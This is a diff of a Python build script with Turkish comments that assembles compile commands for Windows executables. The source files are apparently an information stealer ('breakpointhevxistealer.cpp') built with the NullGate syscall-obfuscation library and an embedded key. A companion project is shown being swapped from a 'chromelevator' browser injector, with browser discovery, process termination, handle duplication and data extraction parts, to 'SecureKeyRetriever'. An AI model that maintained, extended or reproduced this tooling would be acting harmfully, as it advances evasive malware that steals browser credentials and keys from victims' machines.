@@ -22,13 +22,14 @@ NULLGATE_KEY = "FfqO3ZQ6XJ+SICAp"  # NullGate şifreleme anahtarı
 # ===================== DÜZELTİLMİŞ DERLEME KOMUTLARI =====================
 
 def get_linux_build_cmd(output_name):
-    """Linux ortamında cross‑compile ile Windows exe üretir ve build/ klasörüne kaydeder."""
     target_path = f"build/{output_name}"
     return (
-        f'x86_64-w64-mingw32-g++ -std=c++23 -o {target_path} breakpointhevxi.cpp '
+        f'x86_64-w64-mingw32-g++ -std=c++23 -o {target_path} '
+        f'breakpointhevxistealer.cpp '
         f'NullGate/src/nullgate/syscalls.cpp '
         f'NullGate/src/nullgate/obfuscation.cpp '
         f'NullGate/src/nullgate/syscalls.S '
+        f'-I"{PROJECT_ROOT}/libs/sqlite" '
         f'-I"{PROJECT_ROOT}/NullGate/include" '
         f'-I"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/include" '
         f'-L"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/lib" '
@@ -43,23 +44,28 @@ def get_windows_build_cmd(output_name):
     """Windows ortamında native MinGW ile exe üretir ve build\ klasörüne kaydeder."""
     target_path = f"build\\{output_name}"
     return (
-        f'g++ -std=c++23 -o {target_path} breakpointhevxi.cpp '
+        f'g++ -std=c++23 -o {target_path} breakpointhevxistealer.cpp '
         f'NullGate/src/nullgate/syscalls.cpp '
         f'NullGate/src/nullgate/obfuscation.cpp '
         f'NullGate/src/nullgate/syscalls.S '
-        f'-I"{PROJECT_ROOT}/NullGate/include" '
-        f'-I"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/include" '
-        f'-L"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/lib" '
+        # SQLite kaynak dosyası doğrudan derleniyor
+        f'libs\\sqlite\\sqlite3.c '
+        # SQLite include yolu eklendi
+        f'-I"{PROJECT_ROOT}\\libs\\sqlite" '
+        f'-I"{PROJECT_ROOT}\\NullGate\\include" '
+        f'-I"{PROJECT_ROOT}\\vcpkg\\installed\\x64-mingw-static\\include" '
+        f'-L"{PROJECT_ROOT}\\vcpkg\\installed\\x64-mingw-static\\lib" '
         f'-DNULLGATE_KEY=\\"{NULLGATE_KEY}\\" '
         f'-static -O2 '
-        f'-lsqlite3 -lzip -lcurl '
+        # -lsqlite3 kaldırıldı çünkü sqlite3.c doğrudan derleniyor
+        f'-lzip -lcurl '
         f'-lpsapi -lshlwapi -lshell32 -lntdll -lws2_32 -lgdi32 -lz -lbz2 '
         f'-lbcrypt -liphlpapi -lcrypt32 -lsecur32'
     )
 
 def get_dll_build_cmd():
     """
-    DLL COM Elevator2 projesini derlemek için uygun g++/mingw komutunu döndürür.
+    SecureKeyRetriever projesini derlemek için uygun g++/mingw komutunu döndürür.
     Platforma göre farklı komut üretir.
     """
     is_linux_cross = (sys.platform.startswith('linux') or sys.platform.startswith('darwin'))
@@ -67,80 +73,67 @@ def get_dll_build_cmd():
     if is_linux_cross:
         # Linux üzerinde cross-compile (Windows hedef)
         compiler = 'x86_64-w64-mingw32-g++'
-        target_ext = '.exe'
-        out_name = 'chromelevator.exe'
-        # Kaynak dosyalar (örnek proje yapısına göre)
+        out_name = 'SecureKeyRetriever.exe'
+        
+        # Yeni SecureKeyRetriever Proje Yapısındaki Kaynak Dosyalar
         sources = (
-            'src/injector/injector_main.cpp '
-            'src/injector/browser_discovery.cpp '
-            'src/injector/browser_terminator.cpp '
-            'src/injector/process_manager.cpp '
-            'src/injector/pipe_server.cpp '
-            'src/injector/injector.cpp '
-            'src/com/elevator.cpp '
-            'src/sys/internal_api.cpp '
-            'src/crypto/chacha20.cpp '
-            'src/crypto/aes_gcm.cpp '
-            'src/payload/pipe_client.cpp '
-            'src/payload/data_extractor.cpp '
-            'src/payload/handle_duplicator.cpp '
-            'src/payload/payload_main.cpp '
-            'src/sys/bootstrap.cpp '
+            'src/main.cpp '
+            'src/core/ComHandler.cpp '
+            'src/core/RegistryScanner.cpp '
+            'src/core/MemoryScanner.cpp '
+            'src/core/CryptoHelper.cpp '
+            'src/utils/StringUtils.cpp '
+            'src/utils/GuidUtils.cpp '
+            'src/utils/Logger.cpp '
         )
-        # Include ve lib yolları
+        
+        # Yeni Proje Yapısındaki Include Yolları
         includes = (
             f'-I"{PROJECT_ROOT}/include" '
             f'-I"{PROJECT_ROOT}/src" '
-            f'-I"{PROJECT_ROOT}/libs/sqlite" '
-            f'-I"{PROJECT_ROOT}/NullGate/include" '
         )
+        
+        # Gerekli Kütüphaneler
         libs = (
-            '-L. -Lbuild '
-            '-lsqlite3 -lbcrypt -lole32 -loleaut32 -lshell32 -lversion -lcomsuppw '
-            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 -lntdll -lpsapi -lshlwapi '
-            '-lws2_32 -lgdi32 -lz -lbz2 -liphlpapi -lsecur32 '
-            '-static -O2'
+            '-static -O2 '
+            '-lole32 -loleaut32 -lshell32 -lversion '
+            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 '
+            '-lws2_32 -lgdi32'
         )
     else:
         # Windows native
         compiler = 'g++'
-        target_ext = '.exe'
-        out_name = 'chromelevator.exe'
+        out_name = 'SecureKeyRetriever.exe'
+        
+        # Yeni SecureKeyRetriever Proje Yapısındaki Kaynak Dosyalar (Windows path)
         sources = (
-            'src\\injector\\injector_main.cpp '
-            'src\\injector\\browser_discovery.cpp '
-            'src\\injector\\browser_terminator.cpp '
-            'src\\injector\\process_manager.cpp '
-            'src\\injector\\pipe_server.cpp '
-            'src\\injector\\injector.cpp '
-            'src\\com\\elevator.cpp '
-            'src\\sys\\internal_api.cpp '
-            'src\\crypto\\chacha20.cpp '
-            'src\\crypto\\aes_gcm.cpp '
-            'src\\payload\\pipe_client.cpp '
-            'src\\payload\\data_extractor.cpp '
-            'src\\payload\\handle_duplicator.cpp '
-            'src\\payload\\payload_main.cpp '
-            'src\\sys\\bootstrap.cpp '
+            'src\\main.cpp '
+            'src\\core\\ComHandler.cpp '
+            'src\\core\\RegistryScanner.cpp '
+            'src\\core\\MemoryScanner.cpp '
+            'src\\core\\CryptoHelper.cpp '
+            'src\\utils\\StringUtils.cpp '
+            'src\\utils\\GuidUtils.cpp '
+            'src\\utils\\Logger.cpp '
         )
+        
+        # Yeni Proje Yapısındaki Include Yolları
         includes = (
             f'-I"{PROJECT_ROOT}\\include" '
             f'-I"{PROJECT_ROOT}\\src" '
-            f'-I"{PROJECT_ROOT}\\libs\\sqlite" '
-            f'-I"{PROJECT_ROOT}\\NullGate\\include" '
         )
+        
+        # Gerekli Kütüphaneler
         libs = (
-            '-L. -Lbuild '
-            '-lsqlite3 -lbcrypt -lole32 -loleaut32 -lshell32 -lversion -lcomsuppw '
-            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 -lntdll -lpsapi -lshlwapi '
-            '-lws2_32 -lgdi32 -lz -lbz2 -liphlpapi -lsecur32 '
-            '-static -O2'
+            '-static -O2 '
+            '-lole32 -loleaut32 -lshell32 -lversion '
+            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 '
+            '-lws2_32 -lgdi32'
         )
     
     target = f'build/{out_name}' if is_linux_cross else f'build\\{out_name}'
     cmd = f'{compiler} -std=c++23 -o {target} {sources} {includes} {libs}'
     return cmd
-
 # ===================== BuildWorker SINIFI =====================
 class BuildWorker(QObject):
     output_signal = pyqtSignal(str)
